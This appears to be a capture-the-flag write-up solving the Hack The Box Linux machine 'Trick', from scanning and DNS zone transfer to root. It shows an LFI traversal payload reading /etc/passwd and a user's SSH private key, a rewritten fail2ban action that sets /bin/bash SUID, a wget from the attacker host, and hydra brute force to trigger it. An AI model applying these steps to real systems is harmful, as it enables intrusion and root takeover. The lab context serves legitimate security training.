---
title: Trick Writeup
author: ak3dv
date: 2023-02-09
categories: [Writeup, HTB]
tags: [Linux, CTF]
image:
  path: ../../assets/img/commons/Trick/trick_logo.png 
  width: 700
  height: 900
  alt: Banner Trick
---

We are going to solve an easy Linux machine from Hackthebox called Trick.

## Exploitation Guide for Trick

### Scanning

```bash
# Nmap 7.92 scan initiated Sun Jun 26 11:15:40 2022 as: nmap -p22,25,53,80 -n -v -sCV -oN targeted 10.10.11.166
Nmap scan report for 10.10.11.166
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 26 11:16:28 2022 -- 1 IP address (1 host up) scanned in 48.27 seconds
```

### SMTP

I tried some basic enumeration but I didn't find anything interesting ([hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp))

```bash
nc -vn 10.10.11.166 25
(UNKNOWN) [10.10.11.166] 25 (smtp) open
helo
220 debian.localdomain ESMTP Postfix (Debian/GNU)
501 Syntax: HELO hostname
```

I also tried to enumerate users with `smtp-user-enum`, but with no luck.

```bash
smtp-user-enum -M VRFY -u /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.10.11.166
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Target count ............. 1
Username count ........... 1
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sun Jun 26 16:19:02 2022 #########
######## Scan completed at Sun Jun 26 16:19:07 2022 #########
0 results.

1 queries in 5 seconds (0.2 queries / sec)
```

### DNS

Through the `nslookup` command we notice a domain `trick.htb`.

```bash
nslookup
> server 10.10.11.166
Default server: 10.10.11.166
Address: 10.10.11.166#53
> 10.10.11.166
166.11.10.10.in-addr.arpa	name = trick.htb.
```

Add the domain in  the `/etc/hosts` file to get static resolution.

```bash
echo "10.10.11.166 trick.htb" | sudo tee -a /etc/hosts
```

Next, we can try to check if it's vulnerable to DNS zone transfer.

#### Explanation

**DNS zone transfer, also known as DNS query type AXFR, is a process by which a DNS server passes a copy of part of its database to another DNS server.** 

Knowing this, if it's not properly configured, we can get all the info that replicates to the slave server.

In this case is not properly configured, and we notice an interesting subdomain: `preprod-payroll.trick.htb`.

```bash
dig axfr @10.10.11.166 trick.htb

; <<>> DiG 9.17.19-1-Debian <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 63 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Sun Jun 26 16:22:48 CEST 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

Again, we have to add the new subdomain to our `/etc/hosts` file.

```bash
echo "10.10.11.166 preprod-payroll.trick.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration

The first page `trick.htb` doesn’t reveal anything interesting.

![Website](/assets/img/commons/Trick/Page.png)

Let's check `preprod-payroll.trick.htb`.

Once inside we see a login page, trying `admin:admin` some default `user:passwords` and some SQLinjection payloads `‘or 1=1 — -` we are not able to log in.

![Website](/assets/img/commons/Trick/Page_02.png)

Let's do some `fuzzing`:

```bash
dirsearch -u http://preprod-payroll.trick.htb

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/akera/.dirsearch/reports/preprod-payroll.trick.htb/_22-06-26_16-31-07.txt

Error Log: /home/akera/.dirsearch/logs/errors-22-06-26_16-31-07.log

Target: http://preprod-payroll.trick.htb/

[16:31:07] Starting: 
[16:31:26] 200 -    0B  - /ajax.php
[16:31:27] 301 -  185B  - /assets  ->  http://preprod-payroll.trick.htb/assets/
[16:31:27] 403 -  571B  - /assets/
[16:31:32] 301 -  185B  - /database  ->  http://preprod-payroll.trick.htb/database/
[16:31:32] 403 -  571B  - /database/
[16:31:37] 200 -    2KB - /header.php
[16:31:37] 200 -  486B  - /home.php
[16:31:38] 302 -    9KB - /index.php  ->  login.php
[16:31:41] 200 -    5KB - /login.php
[16:31:51] 200 -  149B  - /readme.txt
[16:31:59] 200 -    2KB - /users.php

Task Completed
```

We observe an interesting file `/users.php`.

![Users](/assets/img/commons/Trick/users.png)

Reviewing the code, we can see more interesting info: `manage_user.php?id=`

```bash
$('#new_user').click(function(){
	uni_modal('New User','manage_user.php')
})
$('.edit_user').click(function(){
	uni_modal('Edit User','manage_user.php?id='+$(this).attr('data-id'))
})
$('.delete_user').click(function(){
		_conf("Are you sure to delete this user?","delete_user",[$(this).attr('data-id')])
	})
	function delete_user($id){
		start_load()
		$.ajax({
			url:'ajax.php?action=delete_user',
			method:'POST',
			data:{id:$id},
			success:function(resp){
				if(resp==1){
					alert_toast("Data successfully deleted",'success')
					setTimeout(function(){
						location.reload()
					},1500)

				}
			}
		})
	}
```

By making a get request: `manage_user.php?id=1` we get info about the user and his password: `Enemigosss:SuperGucciRainbowCake`.

![Password](/assets/img/commons/Trick/password.png)

Let's use these credentials to login into the first portal.

We can log in as Administrator but after an hour i didn’t find any interesting info.

![Panel](/assets/img/commons/Trick/panel.png)

So at this point i was lost, after a long time without knowing what to do, I remembered the subdomain `preprod-payroll.trick.htb` and after that I tried to get more subdomains with the following syntax `preprod-FUZZ.trick.htb`.

```bash
wfuzz -c -t 60 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST:preprod-FUZZ.trick.htb" -u http://10.10.11.166 --hl=83
```

And we found another subdomain: `preprod-marketing.trick.htb`

After adding the new domain to `/etc/hosts` we can see another page:

![Page](/assets/img/commons/Trick/page_03.png)

In this one, we can check that is loading pages through the `page` parameter: `http://preprod-marketing.trick.htb/index.php?page=services.html`.

Knowing this, we can try some `LFI` payloads.

After some minutes, I tried the following payload: `http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd` bypassing the filter and being able to read files.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

Now we can check if the `id_rsa` exists in the `/home/michael/.ssh` directory: `http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa`.

And it exists.

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

### Shell as Michael

With the following private key, we can login via SSH (`remember to give 600 permissions to the key`).

```bash
chmod 600 id_rsa

ssh -i id_rsa michael@10.10.11.166

Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jun 26 16:10:45 2022 from 10.10.14.25

bash-5.0$ cat user.txt 
1eb.......fb59b
bash-5.0$
```

### PRIV ESC

Checking over the `sudoers` permissions, we can see that we are able to restart the `fail2ban` service.

```bash
bash-5.0$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Also, we see that Michael is part of the `security` group:

```bash
bash-5.0$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

Being in this group allows us to `read, write, traverse` over the `/etc/fail2ban/action.d` directory, so we may have to modify some `fail2ban` configuration files to get a shell as root.

```bash
bash-5.0$ find / -group security 2>/dev/null
/etc/fail2ban/action.d

-bash-5.0$ ls -la /etc/fail2ban/action.d
total 288
drwxrwx--- 2 root security 4096 Jun 26 17:00 .
drwxr-xr-x 6 root root 4096 Jun 26 17:00 ..
```

But first lets get more info about `fail2ban`: **Fail2ban is an intrusion prevention software framework that protects computer servers from brute-force attacks**.

#### Fail2ban

The way `File2ban` works is that you have a configuration file called `jail.conf` located in `/etc/fail2ban`, this configuration file has different services and determines whether `fail2ban` for a specific service is enabled or not, what ban action to take in case of three fail auth attempts(in `/etc/fail2ban/action.d`), how much time someone will be banned for, etc. 

In case these variables are not determined for a specific service, fail2ban will take the value of the `[default]` service.
For more details on how fail2ban works, check out [this](https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server) awesome article from digital ocean.

In the `/etc/fail2ban/jail.d/defaults-debian.conf` we can check that is enabled for SSH.

```bash
bash-5.0$ cat defaults-debian.conf 
[sshd]
enabled = true
```

So let's inspect the configuration file `/etc/fail2ban/jail.local`.
Reviewing the code, I cannot see the `banaction` established, so based in the documentation is using the default config.

```bash
# SSH servers
#

[sshd]

# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
# normal (default), ddos, extra or aggressive (combines all).
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
#mode   = normal
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s
```

#### Default config

Important things to note are: 

- bantime  = 10s `(the time to be banned)`
- findtime  = 10s `(the time frame to fail the login)`
- maxretry = 5 `(attempts to perform until getting banned)`
- banaction = iptables-multiport `(banaction performed, is getting the config from iptables-multiport)`

```bash
[DEFAULT]

#
# MISCELLANEOUS OPTIONS
#

# "ignorself" specifies whether the local resp. own IP addresses should be ignored
# (default is true). Fail2ban will not ban a host which matches such addresses.
#ignorself = true

# "ignoreip" can be a list of IP addresses, CIDR masks or DNS hosts. Fail2ban
# will not ban a host which matches an address in this list. Several addresses
# can be defined using space (and/or comma) separator.
#ignoreip = 127.0.0.1/8 ::1

# External command that will take an tagged arguments to ignore, e.g. <ip>,
# and return true if the IP is to be ignored. False otherwise.
#
# ignorecommand = /path/to/command <ip>
ignorecommand =

# "bantime" is the number of seconds that a host is banned.
bantime  = 10s

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10s

# "maxretry" is the number of failures before a host get banned.
maxretry = 5

# "backend" specifies the backend used to get files modification.
# Available options are "pyinotify", "gamin", "polling", "systemd" and "auto".
# This option can be overridden in each jail as well.
#
# pyinotify: requires pyinotify (a file alteration monitor) to be installed.
#              If pyinotify is not installed, Fail2ban will use auto.
# gamin:     requires Gamin (a file alteration monitor) to be installed.
#              If Gamin is not installed, Fail2ban will use auto.
# polling:   uses a polling algorithm which does not require external libraries.
# systemd:   uses systemd python library to access the systemd journal.
#              Specifying "logpath" is not valid for this backend.
#              See "journalmatch" in the jails associated filter config
# auto:      will try to use the following backends, in order:
#              pyinotify, gamin, polling.
#
# Note: if systemd backend is chosen as the default but you enable a jail
#       for which logs are present only in its own log files, specify some other
#       backend for that jail (e.g. polling) and provide empty value for
#       journalmatch. See https://github.com/fail2ban/fail2ban/issues/959#issuecomment-74901200
backend = auto

# "usedns" specifies if jails should trust hostnames in logs,
#   warn when DNS lookups are performed, or ignore all hostnames in logs
#
# yes:   if a hostname is encountered, a DNS lookup will be performed.
# warn:  if a hostname is encountered, a DNS lookup will be performed,
#        but it will be logged as a warning.
# no:    if a hostname is encountered, will not be used for banning,
#        but it will be logged as info.
# raw:   use raw value (no hostname), allow use it for no-host filters/actions (example user)
usedns = warn

# "logencoding" specifies the encoding of the log files handled by the jail
#   This is used to decode the lines from the log file.
#   Typical examples:  "ascii", "utf-8"
#
#   auto:   will use the system locale setting
logencoding = auto

# "enabled" enables the jails.
#  By default all jails are disabled, and it should stay this way.
#  Enable only relevant to your setup jails in your .local or jail.d/*.conf
#
# true:  jail will be enabled and log files will get monitored for changes
# false: jail is not enabled
enabled = false

# "mode" defines the mode of the filter (see corresponding filter implementation for more info).
mode = normal

# "filter" defines the filter to use by the jail.
#  By default jails have names matching their filter name
#
filter = %(__name__)s[mode=%(mode)s]

#
# ACTIONS
#

# Some options used for actions

# Destination email address used solely for the interpolations in
# jail.{conf,local,d/*} configuration files.
destemail = root@localhost

# Sender email address used solely for some actions
sender = root@<fq-hostname>

# E-mail action. Since 0.8.1 Fail2Ban uses sendmail MTA for the
# mailing. Change mta configuration parameter to mail if you want to
# revert to conventional 'mail'.
mta = sendmail

# Default protocol
protocol = tcp

# Specify chain where jumps would need to be added in ban-actions expecting parameter chain
chain = <known/chain>

# Ports to be banned
# Usually should be overridden in a particular jail
port = 10000

# Format of user-agent https://tools.ietf.org/html/rfc7231#section-5.5.3
fail2ban_agent = Fail2Ban/%(fail2ban_version)s

#
# Action shortcuts. To be used to define action parameter

# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
banaction_allports = iptables-allports
```

Knowing this and being able to write on the `/etc/fail2ban/action.d` directory and also being able to restart the `fail2ban` service `sudo /etc/init.d/fail2ban restart`, we can delete the `iptables-multiport.conf` and we can create a new one with our payload `actionban = chmod u+s /bin/bash`.

```bash
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = chmod u+s /bin/bash

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
```

The problem is that `root` is rewriting all the files after 3 minutes, so we have to be quick.

#### Exploiting Fail2ban misconfiguration

```bash
bash-5.0$ cd /etc/fail2ban/action.d/

-bash-5.0$ rm iptables-multiport.conf
rm: remove write-protected regular file 'iptables-multiport.conf'? y

-bash-5.0$ wget [http://10.10.14.25/iptables-multiport.conf](http://10.10.14.25/iptables-multiport.conf)
--2022-06-26 17:25:10-- [http://10.10.14.25/iptables-multiport.conf](http://10.10.14.25/iptables-multiport.conf)
Connecting to 10.10.14.25:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1389 (1.4K) [application/octet-stream]
Saving to: ‘iptables-multiport.conf’
iptables-multiport.conf                  100%[==================================================================================>]   1.36K  --.-KB/s    in 0s
2022-06-26 17:25:11 (196 MB/s) - ‘iptables-multiport.conf’ saved [1389/1389]

bash-5.0$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

After rewriting the `/etc/fail2ban/action.d/iptables-multiport.conf` and restarting the service `sudo /etc/init.d/fail2ban restart` we have to fail 5 times on the SSH login in a frame time of 10 seconds.

We can fail 5 times using `hydra`.

```bash
hydra -l michael -P /usr/share/wordlists/rockyou.txt 10.10.11.166 ssh -vV -f -I
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-26 17:25:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.11.166:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://michael@10.10.11.166:22
[INFO] Successful, password authentication is supported by ssh://10.10.11.166:22
[ATTEMPT] target 10.10.11.166 - login "michael" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.11.166 - login "michael" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.11.166 - login "michael" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.11.166 - login "michael" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.11.166 - login "michael" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
```

After 5 failed attempts, we can get a shell as root.

```bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash

-bash-5.0$ bash -p
bash-5.0# cat root.txt 
25be2......52f2
```
